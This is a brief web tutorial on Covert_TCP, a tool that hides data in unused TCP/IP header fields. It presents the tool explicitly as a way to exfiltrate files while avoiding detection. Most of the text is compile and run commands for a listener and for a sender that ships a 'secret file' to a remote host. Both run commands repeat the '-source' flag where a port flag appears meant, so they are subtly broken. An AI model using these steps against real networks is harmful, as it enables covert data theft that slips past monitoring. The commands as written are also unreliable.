---
path: "/tutorials/securitypentesttools/covert_tcp"
date: "2020-04-06"
title: "Covert_TCP"
---

Covert_TCP allows data to be exfiltrated via the unused fields present in TCP/IP headers. This is a useful technique to avoid detection when exfiltrating data. 

We're going to exfiltrate a text file using Covert_TCP. You'll need to set up a sender and a listener device. Once you've downloaded covert_tcp.c to your sender you'll have to compile it.

```bash
cc -o covert_tcp covert_tcp.c
```

On the destination machine do the following:

```bash
cc -o covert_tcp covert_tcp.c
./covert_tcp -dest <destinationIP> -source <sourceIP> -source <sourcePort> -dest_port <destinationPort> -server -file <myDirectory>
```

This has now set it up to receive a file via Covert_TCP. 

Now we'll need to do the following on the sender:

```bash
cc -o covert_tcp covert_tcp.c
./covert_tcp -dest <destinationIP> -source <sourceIP> -source <sourcePort> -dest_port <destinationPort> -file <mySecretFile>
```

Once you enter this command you will see data start to come in on the receiver. In essence this is how you can covertly send data to a remote host.